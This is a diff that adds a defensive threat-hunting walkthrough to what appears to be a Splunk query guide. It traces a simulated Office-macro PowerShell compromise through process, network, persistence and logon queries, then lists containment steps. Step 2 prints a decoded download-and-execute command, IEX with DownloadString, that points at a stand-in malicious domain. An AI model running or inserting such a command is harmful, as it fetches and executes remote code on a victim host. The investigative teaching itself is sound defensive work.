@@ -399,3 +399,195 @@ Every environment logs data differently. Queries may require modification depend
 These queries are intended to provide a **starting point for investigations**, not static detection rules.
 
 Threat hunting is an iterative process. The best analysts continuously refine queries, pivot through telemetry, and build timelines to uncover malicious activity.
+
+
+
+# Example Investigation Walkthrough
+
+The following example demonstrates how Splunk queries can be used to investigate a potentially compromised host.
+
+## Scenario
+
+A SOC alert indicates suspicious PowerShell execution on a workstation.
+
+Alert details:
+
+Host: WS-1021  
+User: jdoe  
+Process: powershell.exe  
+Time: 14:12:43
+
+The goal is to determine:
+
+- how the command was executed
+- what the command did
+- whether persistence was established
+- whether lateral movement occurred
+
+---
+
+## Step 1 — Identify the Process Execution
+
+Start by examining the PowerShell execution event.
+
+
+index="*" EventCode=1 Image="*powershell.exe"
+| table _time host User ParentImage CommandLine
+| sort _time
+
+
+Key indicators to investigate:
+
+- encoded commands
+- download activity
+- suspicious parent processes
+
+Example suspicious output:
+
+
+ParentImage: winword.exe
+CommandLine: powershell.exe -enc SQBtAG...
+
+
+This suggests a **malicious Office macro execution chain**.
+
+MITRE ATT&CK  
+T1204 – User Execution
+
+---
+
+## Step 2 — Decode the PowerShell Command
+
+Encoded commands should always be decoded for analysis.
+
+Example encoded string:
+
+
+SQBtAG...
+
+
+After decoding, the command reveals:
+
+
+IEX (New-Object Net.WebClient).DownloadString('http://maliciousdomain/payload.ps1
+')
+
+
+This indicates the host downloaded a remote PowerShell payload.
+
+MITRE ATT&CK  
+T1105 – Ingress Tool Transfer
+
+---
+
+## Step 3 — Identify Network Connections
+
+Next, identify outbound connections from the host.
+
+
+index="*" EventCode=3 host="WS-1021"
+| table _time host Image DestinationIp DestinationPort
+
+
+Investigate:
+
+- unknown IP addresses
+- unusual ports
+- uncommon processes making connections
+
+Example suspicious activity:
+
+
+powershell.exe → 185.244.25.91:443
+
+
+---
+
+## Step 4 — Check for Persistence
+
+Attackers often establish persistence after gaining execution.
+
+### Service Creation
+
+
+index="*" EventCode=7045 host="WS-1021"
+| table _time Service_Name Service_File_Name
+
+
+### Scheduled Tasks
+
+
+index="*" EventCode=4698 host="WS-1021"
+| table _time TaskName CommandLine
+
+
+Investigate any tasks or services created shortly after the PowerShell execution.
+
+MITRE ATT&CK  
+T1547 – Boot or Logon Autostart Execution
+
+---
+
+## Step 5 — Investigate Lateral Movement
+
+Authentication logs can reveal whether the attacker moved to other systems.
+
+
+index="*" EventCode=4624 User="jdoe"
+| table _time host Logon_Type
+
+
+Focus on:
+
+| Logon Type | Meaning |
+|------------|--------|
+| 3 | Network logon |
+| 10 | Remote interactive (RDP) |
+
+Multiple remote logons across systems may indicate lateral movement.
+
+MITRE ATT&CK  
+T1021 – Remote Services
+
+---
+
+## Step 6 — Build an Attack Timeline
+
+Finally, reconstruct the sequence of events.
+
+
+index="*" host="WS-1021"
+| table _time Image CommandLine ParentImage User
+| sort _time
+
+
+Example timeline:
+
+
+14:12:43 winword.exe launches powershell.exe
+14:12:45 powershell.exe downloads payload
+14:12:50 payload establishes network connection
+14:13:05 scheduled task created
+
+
+This timeline provides a clear view of attacker activity.
+
+---
+
+## Investigation Outcome
+
+Findings:
+
+- PowerShell executed via malicious Office macro
+- remote payload downloaded
+- outbound command-and-control connection established
+- persistence created via scheduled task
+
+Host WS-1021 confirmed compromised.
+
+Containment actions:
+
+- isolate affected host
+- reset compromised credentials
+- block malicious IP address
+- remove persistence mechanism
